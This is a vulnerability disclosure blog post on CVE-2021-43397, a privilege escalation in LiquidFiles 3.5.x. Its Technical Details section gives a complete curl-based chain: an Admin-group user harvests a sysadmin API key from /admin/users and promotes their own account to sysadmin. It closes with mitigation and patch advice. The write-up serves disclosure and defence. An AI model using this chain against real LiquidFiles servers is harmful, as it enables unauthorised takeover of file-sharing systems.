---
title: LiquidFiles 3.5.13 Privilege Escalation
categories: [CVE, LiquidFiles]
tags: [LiquidFiles, CVE, Exploit, Privilege Escalation, CVE-2021-43397]
---

# LiquidFiles 3.5.13 Privilege Escalation (CVE-2021-43397)

With two of my colleagues, during an engagement for a customer, we discovered a Privilege Escalation in the LiquidFiles 3.5.15.

This security issue is published on [CVE-2021-43397](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43397).

Basically, the APIs allow the download of the users' list. If the used user is an "Admin User" you can retrieve the "System Administrator" user's API key and use it to administer all aspects of the LiquidFiles system.

<img src="/assets/img/posts/cve-2021-43397/cve.png" width="50%" height="50%">

The LiquidFiles groups we refer to are those inside the blue box in the following image:

![LiquidFiles Groups](/assets/img/posts/cve-2021-43397/groupsLiquidFiles.png) 
*Resources from https://man.liquidfiles.com/configuration/groups.html*


The most privileged group is "Sysadmins", so, the impact of a successful attack includes access to all aspects of the LiquidFiles system of the application via the System Administrator API key.


### <span style="color: var(--link-color);">Technical Details</span>


To reproduce the attacks, we need the API key of own user (that must be at least of the "Admin Users" group), that we retrieve as follow:

cURL Request:
```
curl -X POST -H "Accept: application/json" -H "Content-Type:application/json" -d '{"user":{"email":"[user-admins_user_mail]","password":"[CENSORED]"}}' https://[CENSORED]/login
```

Response:
```
{"user":{"api_key":"[user-admins_user_API_key]"}}
```


Now, we can use the APIs that LiquidFiles provides, but we cannot use the sysadmin's APIs because that group is more privileged than our user.
But, from the documentation of LiquidFiles, the admin users can administer the user's accounts. So we can retrieve all the API keys of the other users.
To do this, we use the following request:

cURL Request:
```
curl -s -X GET --user "[user-admins_user_API_key]:x" -H "Accept:application/json" -H "Content-Type: application/json" https://[CENSORED]/admin/users
```

Response:
```
[TRUNCATED]
{"user":
  {
    "id": "[CENSORED]",
    "email": "[CENSORED]",
    "name": "[CENSORED]",
    "group": "sysadmins",
    "max_file_size": 0,
    "filedrop": "disabled",
    "filedrop_email": "disabled",
    "api_key": "[sysadmins_user_API_key]",
    "ldap_authentication": "false",
    "locale": "",
    "time_zone": "",
    "strong_auth_type": "",
    "strong_auth_username": "",
    "delivery_action": "",
    "phone_number": "",
    "last_login_at": "2021-10-29 10:02:11 UTC",
    "last_login_ip": "[CENSORED]",
    "created_at": "2020-06-30 10:49:38 UTC"
  }
},
[TRUNCATED
```

As we can see from the response, we obtain the API key of a sysadmin.

With this key, we can do everything because it is the most privileged group.

For example, we can modify our user to become a sysadmin:

cURL Request:
```
cat <<EOF | curl -s -X PUT --user "[sysadmins_user_API_key]:x" -H "Accept:application/json" -H "Content-Type: application/json" -d @- https://[CENSORED]/admin/users/<user-admins_user_id>
{"user":
  {
    "name": "[user-admins_user_name]",
    "group": "sysadmins"
  }
}
EOF
```

Response
```
{"user":
  {
    "id": "[CENSORED]",
    "email": "[CENSORED]",
    "name": "[CENSORED]",
    "group": "sysadmins",
    "max_file_size": 0,
    "filedrop": "disabled",
    "filedrop_email": "disabled",
    "api_key": "[CENSORED]",
    "ldap_authentication": "true",
    "locale": "",
    "time_zone": "",
    "strong_auth_type": "",
    "strong_auth_username": "",
    "delivery_action": "",
    "phone_number": "",
    "last_login_at": "2021-11-03 13:31:58 UTC",
    "last_login_ip": "[CENSORED]",
    "created_at": "2021-03-03 11:48:37 UTC"
  }
}
```

We verify that the change of groups was successful:

cURL Request
```
curl -X GET -H "Accept: application/json" -H "Content-Type:application/json" --user [user-admins_user_API_key]:x https://[CENSORED]/admin/users/<user-admins_user_id>
```

Response
```
{"user":
  {
    "id": "[CENSORED]",
    "email": "[CENSORED]",
    "name": "[CENSORED]",
    "group": "sysadmins",
    "max_file_size": 0,
    "filedrop": "disabled",
    "filedrop_email": "disabled",
    "api_key": "[CENSORED]",
    "ldap_authentication": "true",
    "locale": "",
    "time_zone": "",
    "strong_auth_type": "",
    "strong_auth_username": "",
    "delivery_action": "",
    "phone_number": "",
    "last_login_at": "2021-11-03 13:34:36 UTC",
    "last_login_ip": "[CENSORED]",
    "created_at": "2021-03-03 11:48:37 UTC"
  }
}
```

And we have the promotion to sysadmin.

<img src="/assets/img/posts/cve-2021-43397/well-done.png" width="50%" height="50%">



There is mitigation to this CVE, by disabling the API in Admins groups but the best solution is to update. Indeed, the LiquidFiles team has already fixed this security issue, so, if you have the vulnerable version, I advise you to update as soon as possible to version 3.6.3, as you can view in the [LiquidFiles release notes](https://man.liquidfiles.com/release_notes/version_3-6-x.html).


